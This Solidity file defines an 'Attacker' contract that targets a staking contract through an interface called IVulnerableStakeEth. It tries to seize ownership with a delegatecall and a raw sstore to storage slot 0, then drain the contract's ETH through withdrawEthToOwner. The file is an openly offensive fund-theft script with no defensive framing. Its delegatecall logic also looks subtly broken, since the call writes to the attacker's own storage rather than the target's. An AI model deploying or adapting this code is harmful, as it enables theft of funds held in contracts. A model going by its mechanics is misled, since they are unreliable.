// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableStakeEth {
    function owner() external view returns (address);
    function withdrawEthToOwner() external;
}

contract Attacker {
    address public vulnerableContractAddress;
    address public newOwnerCandidate;

    constructor(address _vulnerableContractAddress) {
        vulnerableContractAddress = _vulnerableContractAddress;
        newOwnerCandidate = msg.sender;
    }

    
    function attackSetOwner() external {
        
        bytes memory data = abi.encodeWithSignature("setPwnedOwner(address)", newOwnerCandidate);

        (bool success, ) = vulnerableContractAddress.delegatecall(data);
        require(success, "Delegatecall failed");
    }

    
    function setPwnedOwner(address _newOwner) public {
    
        assembly {
            sstore(0, _newOwner)
        }
    }

    
    function checkOwner() external view returns (address) {
        IVulnerableStakeEth vulnerable = IVulnerableStakeEth(vulnerableContractAddress);
        return vulnerable.owner();
    }

    
    function drainEth() external {
        
        IVulnerableStakeEth vulnerable = IVulnerableStakeEth(vulnerableContractAddress);
        vulnerable.withdrawEthToOwner();
    }


    receive() external payable {}
}
